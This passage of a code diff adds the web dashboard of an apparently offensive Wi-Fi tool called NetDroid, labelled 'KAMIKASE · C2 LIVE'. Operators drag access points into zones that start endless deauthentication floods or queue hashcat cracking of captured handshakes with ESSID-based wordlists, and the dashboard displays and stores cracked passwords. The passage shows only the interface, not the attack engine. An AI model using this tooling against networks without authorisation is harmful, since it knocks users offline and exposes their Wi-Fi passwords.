+  .btn-green:hover { background: rgba(0,255,159,0.22); box-shadow: 0 0 12px rgba(0,255,159,0.4); }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width:6px; height:6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: rgba(255,0,60,0.25); border-radius:3px; }
+  ::-webkit-scrollbar-thumb:hover { background: rgba(255,0,60,0.5); }
+</style>
+</head>
+<body>
+
+<header class="cyber border-0 border-b px-6 py-3 flex items-center justify-between sticky top-0 z-30" style="background: rgba(5,6,8,0.92); border-color: var(--line-hot)">
+  <div class="flex items-center gap-5">
+    <div class="logo">NETDROID</div>
+    <div class="tag-mode">⚡ KAMIKASE · C2 LIVE</div>
+    <div class="text-xs text-gray-500" id="timestamp">--:--:--</div>
+  </div>
+  <div class="flex items-center gap-3 text-xs">
+    <span class="text-gray-500">Pacotes: <span id="stat-pkts" class="text-red-400 font-bold">0</span></span>
+    <span class="text-gray-500">PPS: <span id="stat-pps" class="text-yellow-400 font-bold">0</span></span>
+    <span class="text-gray-500">Selec: <span id="stat-sel" class="text-yellow-400 font-bold">0</span></span>
+    <span class="px-2 py-0.5 rounded bg-purple-950/40 border border-purple-700 text-purple-300" title="Memória persistente local">
+      💾 <span id="mem-aps">0</span> APs · <span id="mem-hs">0</span> hs · <span id="mem-pwd" class="text-green-400 font-bold">0</span> senhas
+    </span>
+    <span class="text-gray-500">v1.4.0</span>
+  </div>
+</header>
+
+<!-- Toolbar de seleção (aparece quando há cards selecionados) -->
+<div id="bulk-toolbar" class="hidden glass border-b border-yellow-900/40 px-6 py-2 flex items-center gap-3 sticky top-[57px] z-20">
+  <span class="text-yellow-400 text-sm font-bold">⚡ Ação em massa nos selecionados:</span>
+  <button onclick="moverSelecionados('verde')" class="btn-zone btn-green">→ VERDE (parar ataque)</button>
+  <button onclick="moverSelecionados('vermelha')" class="btn-zone btn-red">→ VERMELHA (deauth)</button>
+  <button onclick="moverSelecionados('azul')" class="btn-zone btn-blue">→ AZUL (crack)</button>
+  <button onclick="limparSelecao()" class="btn-zone bg-gray-800 text-gray-400">Limpar</button>
+</div>
+
+<main class="p-4 grid grid-cols-12 gap-4">
+
+  <section class="col-span-12 grid grid-cols-2 md:grid-cols-4 gap-3">
+    <div class="cyber stat zone-green"><div class="stat-val" style="color:var(--green)" id="cnt-verde">0</div><div class="stat-lbl">▸ APs Saudáveis</div></div>
+    <div class="cyber stat zone-red"><div class="stat-val" style="color:var(--red)" id="cnt-vermelha">0</div><div class="stat-lbl">▸ Sob Deauth</div></div>
+    <div class="cyber stat zone-blue"><div class="stat-val" style="color:var(--cyan)" id="cnt-azul">0</div><div class="stat-lbl">▸ Crack Queue</div></div>
+    <div class="cyber p-4 flex items-center justify-center"><canvas id="chart-zonas" height="80"></canvas></div>
+  </section>
+
+  <!-- ZONA VERDE -->
+  <section class="col-span-12 lg:col-span-4 glass rounded-lg p-4 zone-green">
+    <div class="flex items-center justify-between mb-2">
+      <h2 class="sec" style="color:var(--green)">🟢 Verde · Saudáveis</h2>
+      <button id="btn-mapear" onclick="mapearRedes()" class="btn-zone btn-green font-bold">
+        🔄 Mapear Redes
+      </button>
+    </div>
+    <div class="flex gap-1 mb-3 flex-wrap">
+      <button onclick="moverTodos('verde','vermelha')" class="btn-zone btn-red">→ todos vermelha</button>
+      <button onclick="moverTodos('verde','azul')" class="btn-zone btn-blue">→ todos azul</button>
+      <button onclick="selecionarTodos('verde')" class="btn-zone bg-gray-800 text-yellow-400">selecionar tudo</button>
+    </div>
+    <div id="z-verde" class="space-y-2 min-h-[400px]"></div>
+  </section>
+
+  <!-- ZONA VERMELHA -->
+  <section class="col-span-12 lg:col-span-4 glass rounded-lg p-4 zone-red">
+    <div class="flex items-center justify-between mb-2">
+      <h2 class="sec" style="color:var(--red)">🔴 Vermelha · Sob Deauth</h2>
+      <span class="text-xs text-gray-500 blink">1 pkt / 0.5s · ∞</span>
+    </div>
+    <div class="flex gap-1 mb-3 flex-wrap">
+      <button onclick="moverTodos('vermelha','verde')" class="btn-zone btn-green">← todos verde</button>
+      <button onclick="moverTodos('vermelha','azul')" class="btn-zone btn-blue">→ todos azul</button>
+      <button onclick="selecionarTodos('vermelha')" class="btn-zone bg-gray-800 text-yellow-400">selecionar tudo</button>
+    </div>
+    <div id="z-vermelha" class="space-y-2 min-h-[400px]"></div>
+  </section>
+
+  <!-- ZONA AZUL -->
+  <section class="col-span-12 lg:col-span-4 glass rounded-lg p-4 zone-blue">
+    <div class="flex items-center justify-between mb-2">
+      <h2 class="sec" style="color:var(--cyan)">🔵 Azul · Crack Hashcat</h2>
+      <span class="text-xs text-gray-500">PMKID + handshake</span>
+    </div>
+    <div class="flex gap-1 mb-3 flex-wrap">
+      <button onclick="moverTodos('azul','verde')" class="btn-zone btn-green">← todos verde</button>
+      <button onclick="moverTodos('azul','vermelha')" class="btn-zone btn-red">→ todos vermelha</button>
+      <button onclick="selecionarTodos('azul')" class="btn-zone bg-gray-800 text-yellow-400">selecionar tudo</button>
+    </div>
+    <div id="z-azul" class="space-y-2 min-h-[400px]"></div>
+  </section>
+
+  <!-- WORDLISTS DISPONÍVEIS -->
+  <section class="col-span-12 lg:col-span-4 glass rounded-lg p-4">
+    <h2 class="sec mb-3" style="color:var(--purple)">📚 Wordlists Disponíveis</h2>
+    <div id="wordlist-list" class="space-y-1 max-h-[300px] overflow-y-auto text-xs"></div>
+    <p class="text-xs text-gray-500 mt-3">Coloque arquivos <code>.txt</code> em <code>./WordList/</code> · NetDroid prepende 500-1000 variações contextuais (nome do WiFi + sufixos numéricos + anos + leet speak) <strong>antes</strong> da wordlist escolhida.</p>
+  </section>
+
+  <!-- LOG -->
+  <section class="col-span-12 lg:col-span-8 glass rounded-lg p-4">
+    <h2 class="sec mb-3">▸ Log em Tempo Real</h2>
+    <pre id="logfeed" class="text-xs leading-5 max-h-[300px] overflow-y-auto text-gray-400"></pre>
+  </section>
+
+</main>
+
+<!-- Modal de DETALHES PROFUNDOS do AP -->
+<div id="modal-detalhes" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
+  <div class="cyber rounded-lg p-6 max-w-3xl w-full max-h-[90vh] overflow-y-auto" style="border: 1px solid var(--purple); box-shadow: 0 0 40px rgba(188,19,254,0.3);">
+    <div class="flex items-start justify-between mb-4">
+      <div>
+        <h3 class="text-2xl font-black" style="color:var(--purple)" id="det-essid">?</h3>
+        <p class="text-xs text-gray-500 mt-1" id="det-bssid">?</p>
+      </div>
+      <button onclick="fecharDetalhes()" class="text-gray-400 hover:text-white text-2xl leading-none">×</button>
+    </div>
+    <div id="det-body" class="space-y-4 text-sm"></div>
+    <div class="flex gap-2 mt-6 pt-4 border-t border-purple-900/40">
+      <button onclick="fecharDetalhes()" class="px-4 py-2 rounded glass">Fechar</button>
+    </div>
+  </div>
+</div>
+
+<!-- Modal de configuração crack -->
+<div id="modal" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center">
+  <div class="cyber rounded-lg p-6 max-w-lg w-full zone-blue">
+    <h3 class="text-lg font-bold mb-4" style="color:var(--cyan)">🔓 Configurar Crack — <span id="modal-bssid">?</span></h3>
+    <p class="text-xs text-gray-400 mb-3" id="modal-essid">ESSID: ?</p>
+    <div class="space-y-3 text-sm">
+      <div><label class="text-gray-400">Perfil hashcat (intensidade GPU):</label>
+        <select id="modal-perfil" class="w-full mt-1 bg-black border border-cyan-900 rounded px-2 py-1 text-white"></select></div>
+      <div><label class="text-gray-400">Wordlist base:</label>
+        <select id="modal-wordlist" class="w-full mt-1 bg-black border border-cyan-900 rounded px-2 py-1 text-white"></select></div>
+      <div class="flex items-center gap-2">
+        <input type="checkbox" id="modal-contextual" checked class="accent-cyan-500">
+        <label for="modal-contextual" class="text-gray-400">Prepend 1000 variações contextuais do ESSID (recomendado — testa senhas óbvias antes)</label>
+      </div>
+    </div>
+    <div class="flex gap-2 mt-5">
+      <button onclick="confirmarCrack()" class="flex-1 bg-cyan-700 hover:bg-cyan-600 px-3 py-2 rounded text-white font-bold">Iniciar Crack</button>
+      <button onclick="fecharModal()" class="px-3 py-2 rounded glass">Cancelar</button>
+    </div>
+  </div>
+</div>
+
+<footer class="text-center text-xs text-gray-600 py-4 border-t border-red-900/30 mt-4">
+  NetDroid v1.4.0 · KAMIKASE C2 Live · Localhost only · Uso autorizado apenas
+</footer>
+
+<script>
+const sock = io({transports:["websocket","polling"]});
+let aps = {};
+let zonas = {verde:[], vermelha:[], azul:[]};
+let selecionados = new Set();
+let chartZonas;
+let modalContext = null; // {bssids:[], destinoVoltar:'verde'}
+let zonasRecemDying = new Set();    // bssids que estão na animação morph-to-red
+let zonasRecemBlue = new Set();     // bssids que estão na animação morph-to-blue
+
+function tag(text, classes){return `<span class="inline-block px-2 py-0.5 rounded text-xs ${classes}">${text}</span>`}
+function sevColor(s){return {ok:"bg-green-900 text-green-300",info:"bg-blue-900 text-blue-300",media:"bg-yellow-900 text-yellow-300",alta:"bg-orange-900 text-orange-300",critica:"bg-red-900 text-red-300"}[s]||"bg-gray-800 text-gray-400"}
+
+function cardHTML(ap, zona){
+  const sec = ap.crypto || "?";
+  const wps = ap.wps_enabled ? `<span class="text-red-400 text-xs font-bold">WPS</span>` : "";
+  const score = ap.score ?? 100;
+  const sev = ap.severidade_maior || "ok";
+  const pkts = ap.pacotes || 0;
+  const prog = ap.crack && ap.crack.progresso ? ap.crack.progresso : 0;
+  const status = ap.crack && ap.crack.status ? ap.crack.status : "";
+  const senha = ap.crack && ap.crack.senha ? ap.crack.senha : null;
+  const eta = ap.crack && ap.crack.eta ? ap.crack.eta : "?";
+  const ctxCount = ap.crack && ap.crack.contextual_count ? ap.crack.contextual_count : 0;
+  const isSelected = selecionados.has(ap.bssid);
+  let extra = "";
+  if(zona==="vermelha") {
+    extra = `<div class="text-xs text-red-400 mt-2 font-bold blink">⚡ ${pkts.toLocaleString()} pkts deauth enviados</div>`;
+  } else if(zona==="azul") {
+    extra = `
+      <div class="text-xs mt-2 flex items-center justify-between">
+        <span class="text-cyan-400 font-bold">${status||"queued"}</span>
+        <span class="text-gray-400">${prog.toFixed(1)}% · ETA ${eta}</span>
+      </div>
+      <div class="bg-gray-900 h-1.5 rounded mt-1 overflow-hidden"><div class="progress-bar" style="width:${prog}%"></div></div>
+      ${ctxCount?`<div class="text-xs text-purple-400 mt-1">📚 ${ctxCount} variações contextuais prepended</div>`:""}
+      ${senha?`<div class="text-green-400 text-sm mt-2 font-bold bg-green-950/30 px-2 py-1 rounded border border-green-700">🔓 SENHA: <code>${senha}</code></div>`:""}
+    `;
+  }
+  // Classes de animação
+  const dyingClass = (zona==="vermelha" && zonasRecemDying.has(ap.bssid)) ? "dying" : "";
+  const crystClass = (zona==="azul" && zonasRecemBlue.has(ap.bssid)) ? "crystallizing" : "";
+  const pulseClass = (zona==="vermelha" && !zonasRecemDying.has(ap.bssid)) ? "pulse-red" :
+                     (zona==="azul" && !zonasRecemBlue.has(ap.bssid)) ? "pulse-blue" : "";
+  // Indicadores visuais persistência: 🔓 senha quebrada, 📦 handshake salvo
+  const memBadges = [];
+  if(ap.senha) memBadges.push(`<span class="text-green-400 text-xs" title="Senha quebrada">🔓</span>`);
+  if(ap.handshake_path) memBadges.push(`<span class="text-cyan-400 text-xs" title="Handshake capturado">📦</span>`);
+  if(ap.visitas && ap.visitas > 1) memBadges.push(`<span class="text-purple-400 text-xs" title="Visto ${ap.visitas} vezes">👁 ${ap.visitas}</span>`);
+  return `
+    <div class="ap-card glass rounded p-3 fadein ${pulseClass} ${dyingClass} ${crystClass} ${isSelected?"selected":""}" data-bssid="${ap.bssid}" ondblclick="abrirDetalhes('${ap.bssid}')">
+      <div class="flex items-start gap-2">
+        <input type="checkbox" class="mt-1 accent-yellow-400" ${isSelected?"checked":""} onchange="toggleSelecao('${ap.bssid}')" onclick="event.stopPropagation()">
+        <div class="flex-1 min-w-0 cursor-pointer" onclick="abrirDetalhes('${ap.bssid}')">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center gap-2 min-w-0">
+              <span class="font-bold text-white truncate">${(ap.essid||"<oculto>").substring(0,20)}</span>
+              ${tag(sec, sevColor(sev))}
+              ${wps}
+              ${memBadges.join(" ")}
+            </div>
+            <span class="text-xs ${score<40?"text-red-400":score<70?"text-yellow-400":"text-green-400"} font-bold">${score}</span>
+          </div>
+          <div class="text-xs text-gray-500 mt-1">${ap.bssid} · ch ${ap.canal||"?"} · ${ap.rssi||"?"}dBm <span class="text-gray-600 ml-2">(clique p/ detalhes)</span></div>
+          ${extra}
+          ${ap.achados&&ap.achados.length?`<div class="mt-2 space-y-1">${ap.achados.slice(0,3).map(a=>`<div class="badge-sev-${a.severidade} px-2 py-0.5 rounded text-xs">${a.descricao}</div>`).join("")}</div>`:""}
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+function renderZonas(){
+  ["verde","vermelha","azul"].forEach(z=>{
+    const el = document.getElementById("z-"+z);
+    el.innerHTML = zonas[z].map(bssid=>aps[bssid]?cardHTML(aps[bssid],z):"").join("");
+    document.getElementById("cnt-"+z).textContent = zonas[z].length;
+  });
+  updateChart();
+  atualizarToolbar();
+}
+
+function updateChart(){
+  const data = [zonas.verde.length, zonas.vermelha.length, zonas.azul.length];
+  if(!chartZonas){
+    chartZonas = new Chart(document.getElementById("chart-zonas"),{type:"doughnut",data:{labels:["Saudáveis","Deauth","Crack"],datasets:[{data,backgroundColor:["#00ff9f","#ff003c","#00d4ff"],borderColor:"#000",borderWidth:2}]},options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{labels:{color:"#fafafa",font:{size:10}},position:"right"}}}});
+  } else { chartZonas.data.datasets[0].data=data; chartZonas.update(); }
+}
+
+// ─── Multi-select via checkbox ──────────────────
+function toggleSelecao(bssid){
+  if(selecionados.has(bssid)) selecionados.delete(bssid);
+  else selecionados.add(bssid);
+  atualizarToolbar();
+  // Re-render só o card afetado seria ideal, mas re-render completo simplifica
+  renderZonas();
+}
+function selecionarTodos(zona){
+  zonas[zona].forEach(b=>selecionados.add(b));
+  renderZonas();
+}
+function limparSelecao(){
+  selecionados.clear();
+  renderZonas();
+}
+function atualizarToolbar(){
+  document.getElementById("stat-sel").textContent = selecionados.size;
+  document.getElementById("bulk-toolbar").classList.toggle("hidden", selecionados.size === 0);
+}
+async function moverSelecionados(destino){
+  if(selecionados.size === 0) return;
+  const lista = Array.from(selecionados);
+  if(destino === "azul"){
+    abrirModalParaLote(lista, "verde");
+  } else {
+    lista.forEach(bssid=>moverInterno(bssid, destino));
+    selecionados.clear();
+    renderZonas();
+  }
+}
+
+// ─── Bulk move por zona ─────────────────────────
+async function moverTodos(origem, destino){
+  const lista = [...zonas[origem]];
+  if(lista.length === 0) return;
+  if(destino === "azul"){
+    abrirModalParaLote(lista, origem);
+  } else {
+    lista.forEach(bssid=>moverInterno(bssid, destino));
+    renderZonas();
+  }
+}
+
+// ─── Sortable drag-drop ─────────────────────────
+function bindSortable(){
+  ["verde","vermelha","azul"].forEach(z=>{
+    Sortable.create(document.getElementById("z-"+z),{
+      group:"zonas", animation:150, filter:"input[type=checkbox]", preventOnFilter:false,
+      onEnd: ev=>{
+        const bssid = ev.item.dataset.bssid;
+        const destino = ev.to.id.replace("z-","");
+        const origem = ev.from.id.replace("z-","");
+        if(destino === origem) return;
+        if(destino==="azul"){
+          ev.from.appendChild(ev.item);   // reverte visual até confirmar
+          abrirModalParaLote([bssid], origem);
+        } else {
+          moverInterno(bssid, destino);
+          renderZonas();
+        }
+      }
+    });
+  });
+}
+
+function moverInterno(bssid, destino, perfil, wordlist, contextual){
+  Object.keys(zonas).forEach(z=>zonas[z]=zonas[z].filter(b=>b!==bssid));
+  zonas[destino].push(bssid);
+  // Marca para animação visual de transição
+  if(destino==="vermelha"){
+    zonasRecemDying.add(bssid);
+    setTimeout(()=>{zonasRecemDying.delete(bssid); renderZonas();}, 3100);
+  } else if(destino==="azul"){
+    zonasRecemBlue.add(bssid);
+    setTimeout(()=>{zonasRecemBlue.delete(bssid); renderZonas();}, 1600);
+  }
+  sock.emit("mover_zona",{bssid, destino, perfil, wordlist, contextual});
+  log(`Movido ${bssid} → ${destino}${perfil?` (perfil ${perfil})`:""}`,
+       destino==="vermelha"?"err":destino==="azul"?"info":"ok");
+}
+
+async function abrirModalParaLote(bssids, origem){
+  modalContext = {bssids, origem};
+  const primeiro = aps[bssids[0]] || {};
+  document.getElementById("modal-bssid").textContent =
+    bssids.length === 1 ? bssids[0] : `${bssids.length} APs selecionados`;
+  document.getElementById("modal-essid").textContent =
+    bssids.length === 1 ? `ESSID: ${primeiro.essid||"<oculto>"}` :
+    `ESSIDs: ${bssids.map(b=>aps[b]&&aps[b].essid||"?").slice(0,3).join(", ")}${bssids.length>3?"...":""}`;
+  const perfis = await (await fetch("/api/perfis_hashcat")).json();
+  const wordlists = await (await fetch("/api/wordlists")).json();
+  const sel = document.getElementById("modal-perfil");
+  sel.innerHTML = Object.entries(perfis).map(([k,v])=>`<option value="${k}">${v.label}</option>`).join("");
+  const sw = document.getElementById("modal-wordlist");
+  sw.innerHTML = wordlists.length
+    ? wordlists.map(w=>`<option value="${w}">${w}</option>`).join("")
+    : "<option value=''>(nenhuma — coloque um .txt em ./WordList/)</option>";
+  document.getElementById("modal").classList.remove("hidden");
+}
+function fecharModal(){
+  document.getElementById("modal").classList.add("hidden");
+  modalContext = null;
+}
+function confirmarCrack(){
+  if(!modalContext) return;
+  const perfil = document.getElementById("modal-perfil").value;
+  const wordlist = document.getElementById("modal-wordlist").value;
+  const contextual = document.getElementById("modal-contextual").checked;
+  modalContext.bssids.forEach(bssid=>moverInterno(bssid, "azul", perfil, wordlist, contextual));
+  selecionados.clear();
+  renderZonas();
+  fecharModal();
+}
+
+// ─── Mapear redes (rescan + diff) ───────────────
+async function mapearRedes(){
+  const btn = document.getElementById("btn-mapear");
+  const original = btn.innerHTML;
+  btn.innerHTML = "🔄 Mapeando...";
+  btn.disabled = true;
+  try {
+    const r = await fetch("/api/rescan", {method:"POST"});
+    const data = await r.json();
+    if(data.erro){
+      log(`Erro no remap: ${data.erro}`, "err");
+    } else {
+      log(`✓ Remap concluído: ${data.novos} novas | ${data.atualizados||0} atualizadas | total ${data.total}`,"ok");
+      if(data.novos > 0 && data.novos_essids){
+        toast(`🆕 ${data.novos} redes novas: ${data.novos_essids.slice(0,3).join(", ")}${data.novos_essids.length>3?"...":""}`);
+      } else {
+        toast("Nenhuma rede nova encontrada — todas já mapeadas.");
+      }
+    }
+  } catch(e){
+    log(`Falha no remap: ${e.message}`, "err");
+  } finally {
+    btn.innerHTML = original;
+    btn.disabled = false;
+  }
+}
+
+function toast(msg){
+  let t = document.getElementById("toast");
+  if(!t){
+    t = document.createElement("div");
+    t.id = "toast";
+    t.className = "fixed top-24 right-6 glass border border-purple-700 rounded-lg px-4 py-3 z-50 text-sm fadein";
+    t.style.boxShadow = "0 0 20px rgba(188,19,254,0.4)";
+    document.body.appendChild(t);
+  }
+  t.textContent = msg;
+  t.style.opacity = "1";
+  setTimeout(()=>{t.style.opacity="0"; t.style.transition="opacity .8s"; setTimeout(()=>t.remove(),900);},4000);
+}
+
+// ─── Modal de DETALHES PROFUNDOS ────────────────
+async function abrirDetalhes(bssid){
+  try {
+    const r = await fetch("/api/ap/" + encodeURIComponent(bssid));
+    const ap = await r.json();
+    document.getElementById("det-essid").textContent = ap.essid || "<oculto>";
+    document.getElementById("det-bssid").textContent = ap.bssid + " · ch " + (ap.canal||"?") + " · " + (ap.rssi||"?") + "dBm";
+
+    const linhas = [];
+    // Identidade
+    linhas.push(`<div class="cyber rounded p-3 zone-green">
+      <h4 class="text-xs font-bold text-green-300 mb-2 uppercase tracking-wider">📡 Identificação</h4>
+      <div class="grid grid-cols-2 gap-2 text-xs">
+        <div><span class="text-gray-400">ESSID:</span> <span class="text-white font-bold">${ap.essid||"<oculto>"}</span></div>
+        <div><span class="text-gray-400">BSSID:</span> <code class="text-cyan-400">${ap.bssid||"?"}</code></div>
+        <div><span class="text-gray-400">Canal:</span> <span class="text-white">${ap.canal||"?"}</span></div>
+        <div><span class="text-gray-400">RSSI:</span> <span class="text-yellow-400">${ap.rssi||"?"} dBm</span></div>
+        <div><span class="text-gray-400">Criptografia:</span> <span class="text-orange-400">${ap.crypto||"?"}</span></div>
+        <div><span class="text-gray-400">WPS:</span> ${ap.wps_enabled?'<span class="text-red-400 font-bold">ATIVO ⚠</span>':'<span class="text-green-400">desativado</span>'}</div>
+      </div>
+    </div>`);
+
+    // Score + achados
+    const sev = ap.severidade_maior || "ok";
+    linhas.push(`<div class="cyber rounded p-3" style="border-left:4px solid ${ap.score<40?'#ff003c':ap.score<70?'#fdee00':'#00ff9f'}">
+      <h4 class="text-xs font-bold mb-2 uppercase tracking-wider">🎯 Score de Segurança</h4>
+      <div class="flex items-center gap-3">
+        <div class="text-4xl font-black ${ap.score<40?'text-red-400':ap.score<70?'text-yellow-400':'text-green-400'}">${ap.score??"?"}</div>
+        <div class="text-xs text-gray-400">de 100<br>severidade: <span class="badge-sev-${sev=='ok'?'info':sev} px-2 py-0.5 rounded">${(sev||'ok').toUpperCase()}</span></div>
+      </div>
+      ${ap.achados&&ap.achados.length?`<div class="mt-3 space-y-1">${ap.achados.map(a=>`<div class="badge-sev-${a.severidade} px-2 py-1 rounded text-xs">${a.descricao}</div>`).join("")}</div>`:`<div class="text-xs text-green-400 mt-2">✓ Nenhuma vulnerabilidade detectada</div>`}
+    </div>`);
+
+    // Histórico de visitas
+    linhas.push(`<div class="cyber rounded p-3" style="border-left:4px solid var(--purple)">
+      <h4 class="text-xs font-bold text-purple-300 mb-2 uppercase tracking-wider">📅 Histórico (memória persistente)</h4>
+      <div class="grid grid-cols-2 gap-2 text-xs">
+        <div><span class="text-gray-400">Primeiro visto:</span> <span class="text-white">${ap.primeiro_visto?new Date(ap.primeiro_visto).toLocaleString():"agora"}</span></div>
+        <div><span class="text-gray-400">Última vez:</span> <span class="text-white">${ap.ultima_vez?new Date(ap.ultima_vez).toLocaleString():"agora"}</span></div>
+        <div><span class="text-gray-400">Visitas:</span> <span class="text-purple-400 font-bold">${ap.visitas||1}</span></div>
+        <div><span class="text-gray-400">Pacotes deauth:</span> <span class="text-red-400">${(ap.pacotes||0).toLocaleString()}</span></div>
+      </div>
+      ${ap.historico_zonas&&ap.historico_zonas.length?`<div class="mt-3 text-xs">
+        <div class="text-gray-400 mb-1">Linha do tempo:</div>
+        <div class="space-y-1 max-h-24 overflow-y-auto">${ap.historico_zonas.slice(-10).map(h=>`<div class="text-gray-500">→ <span class="${h.zona==='vermelha'?'text-red-400':h.zona==='azul'?'text-cyan-400':'text-green-400'} font-bold">${h.zona}</span> em ${new Date(h.em).toLocaleString()}</div>`).join("")}</div>
+      </div>`:""}
+    </div>`);
+
+    // Handshake
+    if(ap.handshake_path){
+      linhas.push(`<div class="cyber rounded p-3 zone-blue">
+        <h4 class="text-xs font-bold text-cyan-300 mb-2 uppercase tracking-wider">📦 Handshake Capturado</h4>
+        <div class="text-xs space-y-1">
+          <div><span class="text-gray-400">Arquivo:</span> <code class="text-cyan-400 text-xs break-all">${ap.handshake_path}</code></div>
+          <div><span class="text-gray-400">Capturado em:</span> <span class="text-white">${ap.handshake_em?new Date(ap.handshake_em).toLocaleString():"?"}</span></div>
+        </div>
+      </div>`);
+    }
+
+    // Senha quebrada
+    if(ap.senha){
+      linhas.push(`<div class="cyber rounded p-3" style="border:1px solid #00ff9f; box-shadow:0 0 20px rgba(0,255,159,0.3)">
+        <h4 class="text-xs font-bold text-green-300 mb-2 uppercase tracking-wider">🔓 Senha Quebrada</h4>
+        <div class="text-2xl font-black text-green-400 font-mono"><code>${ap.senha}</code></div>
+        <div class="text-xs text-gray-400 mt-2">
+          Quebrada em ${ap.quebrada_em?new Date(ap.quebrada_em).toLocaleString():"?"}<br>
+          Wordlist: <code class="text-purple-400">${ap.wordlist_usada||"?"}</code>
+        </div>
+      </div>`);
+    }
+
+    // Crack em andamento
+    if(ap.crack && ap.crack.status && ap.crack.status !== "queued"){
+      linhas.push(`<div class="cyber rounded p-3 zone-blue">
+        <h4 class="text-xs font-bold text-cyan-300 mb-2 uppercase tracking-wider">⚙ Crack em Andamento</h4>
+        <div class="text-xs space-y-1">
+          <div>Status: <span class="text-cyan-400 font-bold">${ap.crack.status}</span> · ${(ap.crack.progresso||0).toFixed(1)}%</div>
+          <div class="bg-gray-900 h-2 rounded overflow-hidden mt-1"><div class="progress-bar" style="width:${ap.crack.progresso||0}%"></div></div>
+          ${ap.crack.eta?`<div>ETA: <span class="text-purple-400">${ap.crack.eta}</span></div>`:""}
+          ${ap.crack.contextual_count?`<div>Variações contextuais: <span class="text-purple-400">${ap.crack.contextual_count}</span></div>`:""}
+        </div>
+      </div>`);
+    }
+
+    document.getElementById("det-body").innerHTML = linhas.join("");
+    document.getElementById("modal-detalhes").classList.remove("hidden");
+  } catch(e){
+    log(`Erro ao carregar detalhes: ${e.message}`,"err");
+  }
+}
+function fecharDetalhes(){document.getElementById("modal-detalhes").classList.add("hidden");}
+
+// ─── Stats da memória persistente ───────────────
+async function atualizarStatsMemoria(){
+  try {
+    const r = await fetch("/api/memoria/stats");
+    const s = await r.json();
+    document.getElementById("mem-aps").textContent = s.total_aps || 0;
+    document.getElementById("mem-hs").textContent = s.handshakes_em_disco || 0;
+    document.getElementById("mem-pwd").textContent = s.quebradas || 0;
+  } catch(e){}
+}
+setInterval(atualizarStatsMemoria, 5000);
+
+// ─── Wordlist preview list ──────────────────────
+async function carregarWordlists(){
+  const ws = await (await fetch("/api/wordlists")).json();
+  const el = document.getElementById("wordlist-list");
+  if(!ws || ws.length === 0){
+    el.innerHTML = `<div class="text-gray-500 italic">Nenhuma wordlist em ./WordList/. Adicione arquivos .txt.</div>`;
+  } else {
+    el.innerHTML = ws.map(w=>`
+      <div class="flex items-center justify-between p-2 hover:bg-purple-950/30 rounded">
+        <span class="text-purple-300">📄 ${w}</span>
+        <span class="text-gray-500 text-xs">${w.startsWith("_contextual_")?"(contextual)":"base"}</span>
+      </div>
+    `).join("");
+  }
+}
+
+function log(msg, tipo){
+  const el = document.getElementById("logfeed");
+  const cor = {info:"text-cyan-400",ok:"text-green-400",warn:"text-yellow-400",err:"text-red-400"}[tipo]||"text-gray-400";
+  const t = new Date().toLocaleTimeString();
+  el.innerHTML = `<span class="${cor}">[${t}] ${msg}</span>\n` + el.innerHTML;
+}
+
+setInterval(()=>{document.getElementById("timestamp").textContent = new Date().toLocaleTimeString();},1000);
+setInterval(carregarWordlists, 10000);
+
+let lastTotal=0, lastT=Date.now();
+sock.on("estado_inicial",s=>{
+  (s.aps||[]).forEach(a=>aps[a.bssid]=a);
+  if(s.zonas){zonas={...zonas,...s.zonas}}
+  document.getElementById("stat-pkts").textContent = (s.pacotes_total||0).toLocaleString();
+  renderZonas(); bindSortable(); carregarWordlists(); atualizarStatsMemoria();
+});
+sock.on("rescan_done",d=>{
+  log(`✓ Remap: ${d.novos} novas | ${d.atualizados||0} atualizadas | total ${d.total}`,"ok");
+  atualizarStatsMemoria();
+});
+sock.on("ap_descoberto",a=>{
+  aps[a.bssid]=a;
+  if(!Object.values(zonas).flat().includes(a.bssid)) zonas.verde.push(a.bssid);
+  renderZonas();
+  log(`AP descoberto: ${a.essid||"?"} (${a.bssid}) ${a.crypto||""}`,"ok");
+});
+sock.on("ap_update",a=>{Object.assign(aps[a.bssid]||(aps[a.bssid]={}),a);renderZonas();});
+sock.on("pacotes_total",p=>{
+  const total = p.total||0;
+  const dt = (Date.now()-lastT)/1000;
+  const pps = dt>0?Math.round((total-lastTotal)/dt):0;
+  lastTotal = total; lastT = Date.now();
+  document.getElementById("stat-pkts").textContent = total.toLocaleString();
+  document.getElementById("stat-pps").textContent = pps.toLocaleString();
+});
+sock.on("hashcat_start",d=>{aps[d.item.bssid]=aps[d.item.bssid]||{};aps[d.item.bssid].crack=d.item;renderZonas();log(`▶ Crack iniciado em ${d.item.bssid} (${d.item.contextual_count||0} variações contextuais)`,"info");});
+sock.on("hashcat_progress",d=>{if(aps[d.item.bssid]){aps[d.item.bssid].crack=d.item;renderZonas();}});
+sock.on("hashcat_done",d=>{
+  if(aps[d.item.bssid]){aps[d.item.bssid].crack=d.item;renderZonas();}
+  if(d.item.status==="cracked") log(`🔓 SENHA QUEBRADA ${d.item.bssid}: ${d.item.senha}`,"ok");
+  else log(`❌ Crack falhou ${d.item.bssid}: ${d.item.erro||d.item.status}`,"err");
+});
+sock.on("log",d=>log(d.msg,d.tipo||"info"));
+</script>
+</body></html>"""
+
+
+# ══════════════════ PDF REPORT ═════════════════════════════════
+# Gera ./Familia_xxx/relatorio.pdf ao final do --god se reportlab disponível.
+
+class PDFReport:
+    """Relatório PDF executivo via reportlab."""
+
+    def __init__(self, ui: "TerminalUI"):
+        self.ui = ui
+
+    def gerar(self, output_dir: Path, hosts: List[Dict], stress: Dict,
+              god: Dict, kamikase: Dict, ctx_priv: Optional[Any]):
+        if not HAS_REPORTLAB:
+            self.ui.warn("reportlab não disponível — PDF não gerado.")
+            return None
+        path = output_dir / f"NetDroid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
+        try:
+            doc = SimpleDocTemplate(str(path), pagesize=A4,
+                                     leftMargin=2*cm, rightMargin=2*cm,
+                                     topMargin=2*cm, bottomMargin=2*cm)
+            styles = getSampleStyleSheet()
+            estilo_h1 = ParagraphStyle("H1", parent=styles["Heading1"],
+                                        textColor=rl_colors.HexColor("#cc0000"),
+                                        fontSize=22, spaceAfter=10)
+            estilo_h2 = ParagraphStyle("H2", parent=styles["Heading2"],
